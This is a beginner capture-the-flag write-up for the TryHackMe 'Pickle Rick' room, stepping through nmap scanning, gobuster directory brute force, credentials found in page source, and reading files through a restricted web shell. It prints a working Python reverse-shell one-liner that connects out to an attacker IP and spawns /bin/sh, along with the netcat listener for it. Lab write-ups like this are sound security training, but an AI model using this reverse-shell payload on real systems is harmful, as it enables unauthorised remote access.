# 🥒 Pickle Rick CTF - TryHackMe Write-up

**Date:** 19 April 2025  
**Platform:** TryHackMe  
**CTF Type:** Boot2Root  
**Difficulty:** Easy  

---

## 🔍 Enumeration

### Nmap Scan
```bash
nmap -A -F -oN nmappickle.txt 10.10.103.128
nmap -Pn -F 10.10.103.128
cat nmappickle.txt | grep "open"  # View only open ports
```

**IP Address:** `10.10.103.128`

---

## 🌐 Web Inspection

Visit the target IP in browser: `http://10.10.103.128`

### Source Code Inspection
- Found Username: `R1ckRul3s`

---

## 📂 Directory Brute Force
```bash
gobuster dir -u http://10.10.103.128 -w /usr/share/wordlists/dirb/common.txt -t 64
```

- One directory contains a **text file** that reveals a **password**.

### Credentials:
- **Username:** `R1ckRul3s`
- **Password:** `Wubbalubbadubdub`

Login at: `http://10.10.103.128/login.php`

---

## 📜 Web Shell & File Access

You may not be able to use `cat` directly in the web shell. Alternatives:

```bash
1. while read line; do echo $line; done < filename.txt
2. grep . clue.txt
3. grep -R .      # Recursively read all content
4. Use while-read-echo loops for structured reading
```

---

## 🐚 Reverse Shell Access

- SSH port is open
- Use the reverse shell cheat sheet: [PentestMonkey Reverse Shells](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

```bash
# Replace with your IP (use `ip addr show tun0` to find it)
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.27.206",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

On your Kali/attacking machine:
```bash
nc -lvnp 9999
```

Shell access achieved ✅

---

## 🧪 Finding Ingredients

If files won't open with `cat`, try:
```bash
cat *
```

This will concatenate all files in the directory and show you hidden ingredients or flags.

---

## 🏁 Final Notes

- Source inspection is key
- Use `gobuster` for directory fuzzing
- Web shells can be limited, improvise with Bash scripting
- Reverse shells are a go-to when SSH isn't viable

---

## ✍️ Author Notes

> Pickle Rick was a fun warm-up room to test web enumeration, brute-force basics, and reverse shelling. Good intro CTF for beginners.
